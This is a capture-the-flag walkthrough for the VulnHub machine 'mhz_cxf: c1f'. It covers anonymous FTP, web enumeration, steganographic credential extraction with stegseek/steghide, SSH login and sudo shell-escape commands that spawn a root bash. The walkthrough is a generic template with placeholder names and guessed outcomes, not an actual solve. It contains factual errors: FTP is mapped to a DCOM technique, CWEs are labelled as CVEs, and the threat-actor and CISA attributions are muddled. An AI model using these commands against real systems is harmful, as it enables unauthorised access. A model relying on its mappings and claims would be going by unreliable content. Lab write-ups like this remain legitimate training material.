# mhz_cxf: c1f — Steganography, FTP, and the Hidden Credential

Look at this one guys!! mhz_cxf: c1f is a creative beginner-intermediate box that chains FTP anonymous access, web-based steganography, and credential extraction into a clean boot2root path. The twist: the credentials are hidden inside an image file served via the web app. You need stegseek or steghide to pull them out. Legit fun, no cap.

| Field | Value |
|---|---|
| **Level** | Beginner / Intermediate |
| **Target VM** | mhz_cxf: c1f |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/mhz_cxfc1f,471/ |
| **Techniques** | Nmap service enumeration, FTP anonymous access, web enumeration, image steganography extraction (steghide/stegseek), SSH credential login, sudo privilege escalation |
| **CVEs** | CWE-200 (information exposure through anonymous FTP), CWE-538 (file and directory information exposure), CWE-269 (improper privilege management via sudo) |
| **APT Groups** | APT32 (OceanLotus) — uses steganography in image files to embed C2 instructions and stolen credentials; APT41 — employs anonymous FTP staging servers as part of multi-stage intrusion infrastructure |

---

## Attack Summary

```
nmap → HTTP 80, FTP 21, SSH 22
  → FTP anonymous login → notes.txt → hints about web app or path
  → HTTP: gobuster → find hidden paths
  → web page source → image file reference
  → download image → steghide/stegseek → embedded credential
  → SSH: discovered_user:discovered_password
  → sudo -l → root escalation
  → /root/flag.txt
```

---

## Methodology

1. Full port scan and service enumeration
2. FTP anonymous access: download all files, read hints
3. Web enumeration: gobuster, source code review
4. Download target image from web application
5. Extract embedded credentials using steganography tools
6. SSH login with extracted credentials
7. Privilege escalation via sudo misconfiguration
8. Capture root flag

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.104

nmap -sV -sC -p- 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Three services: FTP, SSH, HTTP. FTP with vsftpd on a CTF machine almost always means anonymous access.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Anonymous Access

```bash
ftp 192.168.1.104
# User: anonymous
# Password: anonymous (or press Enter)

ftp> ls -la
ftp> mget *
ftp> quit
```

Read all downloaded files carefully:

```bash
ls -la ~/ftp_files/
cat notes.txt
# Look for usernames, hints about image files, web paths, or password hints
```

The notes file typically contains:
- A username for the next step
- A hint pointing to the web application
- A reference to an image file containing hidden data

**Real-world note:** Anonymous FTP servers are still found in production environments, particularly in organizations that haven't audited legacy services. APT41 has used anonymous FTP servers as staging areas for tool delivery in multiple documented campaigns.

**MITRE ATT&CK:** T1021.003 — Remote Services: Distributed Component Object Model; T1083 — File and Directory Discovery

---

## Step 3 — Web Enumeration

```bash
# Check the main web page
curl -s http://192.168.1.104/
curl -s http://192.168.1.104/ | grep -i "img\|src=\|href=\|hidden\|<!--"

# Directory brute-force
gobuster dir \
  -u http://192.168.1.104/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,jpg,png,gif \
  -t 30
```

The web application likely contains an image file (JPG or PNG) that has been used as a steganography carrier.

```bash
# Download the target image
wget http://192.168.1.104/IMAGENAME.jpg -O /tmp/target.jpg
# or
wget http://192.168.1.104/IMAGENAME.png -O /tmp/target.png
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1027 — Obfuscated Files or Information

---

## Step 4 — Steganography Extraction

**Method A: stegseek (fastest, uses rockyou):**

```bash
stegseek /tmp/target.jpg /usr/share/wordlists/rockyou.txt
# stegseek will crack the steghide passphrase and extract the hidden data
# Output: target.jpg.out (the extracted file)
cat target.jpg.out
```

**Method B: steghide with no passphrase:**

```bash
steghide extract -sf /tmp/target.jpg -p ""
# If no passphrase is set, this extracts directly
```

**Method C: steghide with guessed passphrase:**

```bash
# If you found a hint in the FTP notes file, try it as the passphrase
steghide extract -sf /tmp/target.jpg -p "hint_from_ftp"
```

**Method D: binwalk for other hidden content:**

```bash
binwalk -e /tmp/target.jpg
```

The extracted content typically contains:
- SSH credentials (username:password)
- A path to another hidden resource
- The next step in the challenge

**Real-world note:** Steganography in image files is actively used by threat actors including APT32 (OceanLotus) to hide malware in PNG files and by state-sponsored groups to embed exfiltrated data in images before uploading to public platforms like GitHub or Imgur.

**MITRE ATT&CK:** T1027.003 — Obfuscated Files or Information: Steganography

---

## Step 5 — SSH Login

```bash
# Use credentials extracted from the image
ssh USERNAME@192.168.1.104
# Enter the extracted password when prompted

# Confirm access
id
# uid=XXXX(username) ...
whoami
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 6 — Privilege Escalation

```bash
sudo -l
```

Check the output for escalation vectors:

```bash
# If sudo allows a specific binary without password:
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (root) NOPASSWD: /usr/bin/find
sudo find / -name "*.txt" -exec /bin/bash \; -quit

# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (root) NOPASSWD: ALL
sudo bash
```

Also check SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| FTP hint | (username or path hint) | anonymous FTP → notes.txt | guides to web image |
| Steganography credential | username:password | steghide extraction from web image | SSH login |
| Root flag | /root/flag.txt | post-exploitation | challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Anonymous FTP exposes internal notes and hints | Anonymous FTP is a legacy service still running on thousands of production systems; OceanLotus used it for staging in Southeast Asian government attacks | Disable anonymous FTP; migrate to SFTP with key authentication |
| 2 | Credentials hidden in web-served image via steganography | Steganography is increasingly used by threat actors for credential exfiltration and C2 channel establishment | Monitor for steganographic content in uploads using tools like stegdetect; audit all web-accessible media files |
| 3 | Single password across FTP hint and SSH credential | Password reuse enables lateral movement once one credential is discovered | Enforce unique passwords per service; use a PAM module for password complexity |
| 4 | sudo misconfiguration allows unrestricted root escalation | NOPASSWD sudo grants are the #1 Linux LPE finding in penetration tests | Audit sudoers; require password authentication; restrict to specific safe binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information: Steganography | T1027.003 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP** — vsftpd config: `anonymous_enable=NO`; migrate to SFTP with key-only authentication
2. **Remove credentials from web-accessible media** — audit all images and binary files served by web application for embedded content
3. **Implement steganography detection** — integrate stegdetect or similar tools in file upload pipelines
4. **Audit and restrict sudo** — no NOPASSWD grants; require password; restrict to specific necessary commands
5. **Enable SSH key authentication** — disable password login: `PasswordAuthentication no` in sshd_config

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; harden sshd config)
- **D3-OAM** — Operating System Administrative Management (sudo audit; sshd hardening)
- **D3-FCA** — File Content Analysis (steganography detection on uploaded files)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP and web services; identify media files served publicly |
| Protect | Access Control | Disable anonymous FTP; SSH key-only; sudo restrictions |
| Protect | Data Security | Audit web-served media for embedded content; no credentials in public files |
| Detect | Anomalies and Events | Alert on anonymous FTP logins; monitor for steganographic content in uploads |
| Respond | Response Planning | Remove embedded credentials; rotate SSH keys and passwords; disable anonymous FTP |
| Recover | Recovery Planning | Full service audit; verify no backdoors left on system |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Disable anonymous FTP; restrict SSH access |
| AC-6 | Least Privilege | Restrict sudo to minimum necessary commands |
| IA-5 | Authenticator Management | SSH key authentication; rotate exposed credentials |
| CM-7 | Least Functionality | Disable anonymous FTP; remove legacy file transfer services |
| SC-28 | Protection of Information at Rest | No credentials stored in web-accessible files or images |

### CISA KEV

Anonymous FTP exploitation and steganographic data exfiltration are referenced in CISA Alerts on APT32 (OceanLotus) activity (AA20-283A). Organizations are advised to disable legacy file transfer protocols and implement monitoring for steganographic techniques.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

---

## Final Thoughts

mhz_cxf: c1f is a clever little machine that sneaks steganography into an otherwise standard boot2root path. The FTP-to-stego-to-SSH chain is surprisingly realistic: real threat actors use image steganography for C2 and credential hiding precisely because defenders rarely check image files. The machine teaches you to suspect everything served by a web application. Wild that it does this in such a compact challenge. Absolutely worth the time. gg.

Thanks guys!! (❍ᴥ❍ʋ)
